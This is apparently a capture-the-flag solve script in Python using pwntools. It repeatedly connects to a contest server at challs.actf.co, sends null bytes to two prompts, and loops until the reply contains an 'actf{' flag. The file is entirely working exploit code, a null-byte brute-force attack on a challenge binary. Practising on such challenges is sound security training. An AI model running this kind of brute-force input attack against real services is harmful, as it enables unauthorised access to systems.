from pwn import *

while True:
    # p = process('./whatsmyname')
    p = remote('challs.actf.co', 31223)

    p.sendlineafter(b'? ', b'\x00')
    p.sendlineafter(b'flag!\n', b'\x00')
    out = p.recv()
    p.close()
    if b'actf{' in out:
        print(out)
        break
